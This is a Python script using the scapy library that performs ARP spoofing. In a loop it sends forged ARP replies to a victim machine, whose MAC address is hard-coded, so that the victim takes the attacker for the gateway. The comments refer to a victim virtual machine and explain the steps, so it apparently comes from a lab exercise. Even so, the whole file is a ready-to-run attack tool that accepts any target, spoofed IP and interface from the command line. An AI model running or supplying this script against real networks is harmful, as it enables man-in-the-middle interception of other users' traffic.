from scapy.all import ARP, sendp, Ether
import time
import argparse

# This is the function that conducts the actual arp spoofing. It takes 3 arguments: Target IP of victim, spoof IP of gateway, and network interface
def arp_spoof(target_ip, spoof_ip, interface):

    # This is the hardcoded mac address of the victim Ubuntu VM.
    target_mac = "08:00:27:ff:6c:08"

    # This constructs the packet that will be sent with sendp
    packet = Ether(dst=target_mac) / ARP(
        op=2,   # code 2 is the code for an ARP reply! This is what ARP spoofing exploits in the ARP protocol.
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    
    print(f"Sending spoofed ARP responses to {target_ip}...")
    try:
        # continue to send ARP packets while program is running
        while True:
            print("Sending ARP packet...")
            sendp(packet, iface=interface, verbose=False)
            time.sleep(2)  # wait 2 seconds between sending each packet
    except KeyboardInterrupt:
        print("\nSpoofing stopped")

def main():
    # argparse has to be used to parse arguments from the command line. The code below makes this possible.
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument('--target', required=True, help="IP address of target")
    parser.add_argument('--spoof', required=True, help="IP address to spoof")
    parser.add_argument('--interface', required=True, help="Network interface to use")

    args = parser.parse_args()

    arp_spoof(args.target, args.spoof, args.interface)

if __name__ == "__main__":
    # make a main function to execute the function arp_spoof
    main()
